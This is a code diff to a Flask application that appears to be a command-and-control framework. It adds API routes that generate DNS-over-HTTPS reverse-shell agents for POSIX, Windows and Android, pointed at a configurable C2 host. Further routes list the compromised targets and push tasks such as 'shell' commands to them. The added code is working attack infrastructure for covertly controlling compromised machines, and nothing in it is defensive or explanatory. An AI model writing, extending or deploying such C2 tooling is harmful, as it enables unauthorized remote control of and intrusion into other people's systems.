@@ -102,6 +102,50 @@ def register_routes(app, agents, API):
             "killswitch": KILLSWITCH["on"],
         })
 
+    # ---- DoH Reverse Shell ----
+    @app.route("/api/dohshell/agent/posix")
+    def dohshell_agent_posix():
+        from quantum.c2.reverseshell import generate_doh_reverse_shell_agent
+        domain = request.args.get("domain", "c2.example.com")
+        c2_host = request.args.get("c2", "192.168.1.1:8443")
+        fn = generate_doh_reverse_shell_agent(domain, c2_host)
+        with open(fn, encoding="utf-8") as f:
+            return f.read(), 200, {"Content-Type": "text/plain"}
+
+    @app.route("/api/dohshell/agent/windows")
+    def dohshell_agent_windows():
+        from quantum.c2.reverseshell import generate_windows_doh_reverse_shell
+        domain = request.args.get("domain", "c2.example.com")
+        c2_host = request.args.get("c2", "192.168.1.1:8443")
+        fn = generate_windows_doh_reverse_shell(domain, c2_host)
+        with open(fn, encoding="utf-8") as f:
+            return f.read(), 200, {"Content-Type": "text/plain"}
+
+    @app.route("/api/dohshell/targets")
+    def dohshell_targets():
+        from quantum.c2.reverseshell import DoHBeaconReceiver
+        domain = request.args.get("domain", "c2.example.com")
+        receiver = DoHBeaconReceiver(domain)
+        return jsonify(receiver.get_active_targets())
+
+    @app.route("/api/dohshell/task", methods=["POST"])
+    def dohshell_task():
+        from quantum.c2.reverseshell import DoHBeaconReceiver
+        d = request.json or {}
+        domain = d.get("domain", "c2.example.com")
+        host_id = d.get("host_id", "hq")
+        command = d.get("command", "shell")
+        params = d.get("params", {})
+        receiver = DoHBeaconReceiver(domain)
+        task = receiver.push_task(host_id, command, params)
+        return jsonify(task)
+
+    @app.route("/api/dohshell/config")
+    def dohshell_config():
+        from quantum.c2.reverseshell import generate_android_c2_config
+        domain = request.args.get("domain", "c2.example.com")
+        return jsonify(generate_android_c2_config(domain))
+
     # ---- OSINT Trackers ----
     @app.route("/api/osint/ip/<ip>")
     def osint_ip(ip):
